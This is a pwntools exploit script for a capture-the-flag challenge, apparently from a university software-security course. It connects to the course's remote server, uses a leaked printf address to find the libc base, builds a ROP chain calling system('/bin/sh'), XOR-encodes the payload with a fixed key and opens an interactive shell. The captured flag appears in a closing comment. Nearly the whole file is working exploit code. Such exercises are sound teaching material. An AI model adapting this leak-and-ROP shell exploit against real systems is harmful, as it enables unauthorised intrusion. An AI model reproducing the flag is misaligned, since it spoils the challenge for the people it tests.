from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b *0x40122f
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 32806)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/xopper") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


def encrypt(bytes_list):
    bytes_list = bytes_list.ljust(200)
    new_bytes_list = [0]*200
    for i in range(200):
        new_bytes_list[i] = bytes_list[i] ^ ord(("Stick around"[i % len("Stick around")]))
    return bytes(new_bytes_list)

p.recvuntil(b"If it bleeds, we can kill it.")
p.sendline(b"Get to")
p.recvuntil(b"Chopper location at ")
printf_addr = int(p.recvline().decode()[2:], 16)
print(hex(printf_addr))
libc_addr = printf_addr - 337328


libc = ELF("./libc.so.6")
libc.address = libc_addr

rop = ROP(libc)
rop.raw(pack(rop.ret.address)) #twice so stack is aligned again
rop.raw(pack(rop.ret.address))
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
payload = rop.chain()
print(payload)
p.sendline(encrypt(b"A"*16+payload))


p.interactive()

#softsec{reaV3qEnfVz5hyBZWCq_9b9K6oEDsYuqoVJL8aZ4YV1klJvSQR1RtOYi2grmwq3C}